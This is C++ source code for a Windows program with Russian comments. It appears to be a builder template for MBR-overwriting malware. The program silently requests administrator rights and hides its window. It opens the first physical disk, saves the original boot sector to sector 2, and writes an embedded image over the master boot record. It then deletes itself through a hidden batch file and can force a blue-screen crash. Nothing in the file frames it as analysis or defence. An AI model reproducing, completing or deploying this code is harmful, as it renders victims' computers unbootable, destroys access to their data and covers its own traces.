#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

const char MBR_HEX[] = "{MBR_DATA}";

// === ЛОГИРОВАНИЕ В ФАЙЛ ===
void Log(const char* msg) {
    std::ofstream log("log.txt", std::ios::app);
    if (log.is_open()) {
        log << msg << std::endl;
        log.close();
    }
}

// === ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ===
bool IsAdmin() {
    Log("IsAdmin() called");
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, 
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    Log(isAdmin ? "IsAdmin: TRUE" : "IsAdmin: FALSE");
    return isAdmin == TRUE;
}

// === ВЫЗОВ BSOD ===
void TriggerBSOD() {
    Log("TriggerBSOD() called");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        Log("ntdll.dll not loaded");
        return;
    }
    
    typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
        NTSTATUS ErrorStatus,
        ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask,
        PULONG_PTR Parameters,
        ULONG ResponseOption,
        PULONG Response
    );
    
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
    if (!NtRaiseHardError) {
        Log("NtRaiseHardError not found");
        return;
    }
    
    ULONG_PTR params[4] = {0};
    ULONG response = 0;
    
    NtRaiseHardError(
        0xC000021A,
        1,
        0,
        params,
        6,
        &response
    );
    Log("BSOD triggered");
}

// === ПОВЫШЕНИЕ ПРАВ ===
void ElevateAndRun() {
    Log("ElevateAndRun() called");
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = GetCommandLineA();
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExA(&sei)) {
        Log("Elevated successfully, exiting...");
        ExitProcess(0);
    } else {
        Log("Elevation failed!");
    }
}

// === КОНВЕРТЕР HEX ===
std::vector<unsigned char> HexToBytes(const std::string& hex) {
    Log("HexToBytes() called");
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    Log("HexToBytes() finished, bytes: " + std::to_string(bytes.size()));
    return bytes;
}

// === ЗАПИСЬ MBR ===
void WriteMBR() {
    Log("=== WriteMBR() START ===");
    
    std::string hex(MBR_HEX);
    Log("Hex length: " + std::to_string(hex.length()));
    
    std::vector<unsigned char> image = HexToBytes(hex);
    Log("Image size: " + std::to_string(image.size()));
    
    if (image.size() < 512) {
        Log("ERROR: image.size() < 512");
        return;
    }
    
    Log("Opening disk...");
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
        NULL
    );
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        Log("CreateFile failed, error: " + std::to_string(GetLastError()));
        // Fallback: обычный доступ
        hDisk = CreateFileA(
            "\\\\.\\PhysicalDrive0",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
        if (hDisk == INVALID_HANDLE_VALUE) {
            Log("Fallback failed, error: " + std::to_string(GetLastError()));
            return;
        }
        Log("Disk opened via fallback");
    } else {
        Log("Disk opened successfully");
    }
    
    // --- ШАГ 1: ЧИТАЕМ ОРИГИНАЛ ---
    Log("Reading original MBR...");
    unsigned char originalMBR[512];
    DWORD bytesRead = 0;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hDisk, originalMBR, 512, &bytesRead, NULL) || bytesRead != 512) {
        Log("ReadFile failed!");
        CloseHandle(hDisk);
        return;
    }
    Log("Original MBR read OK");
    
    // --- ШАГ 2: СОХРАНЯЕМ ОРИГИНАЛ В СЕКТОР 2 ---
    Log("Saving original MBR to sector 2...");
    DWORD bytesWritten = 0;
    SetFilePointer(hDisk, 512 * 2, NULL, FILE_BEGIN);
    if (!WriteFile(hDisk, originalMBR, 512, &bytesWritten, NULL) || bytesWritten != 512) {
        Log("WriteFile to sector 2 failed!");
        CloseHandle(hDisk);
        return;
    }
    Log("Original MBR saved to sector 2");
    
    // --- ШАГ 3: ЗАПИСЫВАЕМ НАШ ОБРАЗ ---
    Log("Writing our image...");
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
    Log("Image written, bytes: " + std::to_string(bytesWritten));
    
    CloseHandle(hDisk);
    Log("Disk closed");
    
    // --- Самоуничтожение ---
    Log("Self-destruct...");
    char szPath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    Log("Path: " + std::string(szPath));
    
    std::string batPath = std::string(szPath) + ".bat";
    std::ofstream bat(batPath.c_str());
    bat << "@echo off\n";
    bat << "timeout /t 1 /nobreak > nul\n";
    bat << "del \"" << szPath << "\"\n";
    bat << "del \"" << batPath << "\"\n";
    bat.close();
    Log("Bat file created");
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    Log("Bat file launched");
    
    // --- BSOD ---
    if (FindResourceA(NULL, "BSOD", "SETTING")) {
        Log("BSOD flag found, triggering...");
        TriggerBSOD();
    } else {
        Log("BSOD flag NOT found");
    }
    
    Log("=== WriteMBR() END ===");
}

// === ТОЧКА ВХОДА ===
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    Log("=== WinMain() START ===");
    
    if (!IsAdmin()) {
        Log("Not admin, elevating...");
        ElevateAndRun();
        return 0;
    }
    Log("Admin OK");
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    Log("Console window hidden");
    
    WriteMBR();
    Log("WriteMBR completed");
    
    Log("=== WinMain() END ===");
    return 0;
}
